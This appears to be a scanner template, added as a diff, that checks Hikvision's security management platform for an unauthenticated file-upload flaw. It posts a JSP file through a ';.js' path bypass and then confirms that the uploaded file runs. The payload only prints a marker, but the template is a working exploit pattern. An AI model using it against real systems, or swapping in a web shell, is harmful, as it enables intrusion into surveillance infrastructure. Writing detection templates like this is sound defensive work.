@@ -1,0 +1,19 @@
+name: HIKVISION-综合安防管理平台-clusters-文件上传
+description: >
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /clusterMgr/clusters/ssl/file;.js
+    headers:
+      Content-Type: "multipart/form-data; boundary=--------------------------984514492333278399715408"
+    body: "----------------------------984514492333278399715408\r\nContent-Disposition: form-data; name=\"file\"; filename=\"languages/360.jsp\"\r\nContent-Type: image/png\r\n\r\n<% out.println(123456);%>\r\n----------------------------984514492333278399715408\r\nContent-Disposition: form-data; name=\"proxyAddress\"\r\n\r\n8.8.8.8\r\n----------------------------984514492333278399715408--"
+    expression:
+      headers:
+        Content-Type: application/json
+  - method: GET
+    path: /clusterMgr/languages/360.jsp;.js
+    expression:
+      status: 200
+      body_all: ["123456"]
